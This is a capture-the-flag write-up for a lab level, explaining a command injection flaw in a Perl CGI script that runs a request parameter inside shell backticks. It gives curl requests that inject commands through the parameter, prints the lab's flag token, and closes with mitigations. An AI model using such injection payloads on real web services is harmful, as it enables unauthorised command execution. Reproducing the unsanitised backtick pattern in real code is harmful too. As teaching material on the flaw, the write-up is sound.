# Level04: Command Injection in Perl CGI

## Description
This level demonstrates a critical command injection vulnerability in a Perl CGI web application. The script executes user-supplied input directly within shell backticks without sanitization, allowing arbitrary command execution with the web server's privileges (`flag04`).

## Vulnerability Analysis

### Vulnerable Code
```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

### The Flaw
- **Backticks execute shell commands:** `` `echo $y` `` passes the string to the shell for execution
- **Unsanitized user input:** `param("x")` retrieves HTTP parameters without validation
- **Direct interpolation:** User input flows directly into the shell command context

## Steps to Exploit

1. **Inspect the script:**
   ```bash
   cat level04.pl
   ```
   - Identified CGI script on `localhost:4747` using backticks with user input

2. **Test basic functionality:**
   ```bash
   curl "http://localhost:4747?x=test"
   ```
   - Output: `test` (confirms parameter handling)

3. **Verify command execution:**
   ```bash
   curl "http://localhost:4747?x=\`whoami\`"
   ```
   - Output: `flag04` (confirms execution as privileged user)

4. **Retrieve the flag:**
   ```bash
   curl "http://localhost:4747?x=\`getflag\`"
   ```
   - Output: `Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap`

## Impact
- Remote code execution with web server privileges
- Local privilege escalation from `level04` to `flag04`
- Full system compromise through arbitrary command execution
- Potential for data exfiltration and lateral movement

## Mitigation
1. **Never use shell execution with user input:** Avoid backticks, `system()`, or `exec()` with untrusted data
2. **Validate and sanitize input:** Use whitelists and strict regex patterns (`/^[a-zA-Z0-9]+$/`)
3. **Use safe alternatives:** Employ array-form system calls that bypass shell interpretation
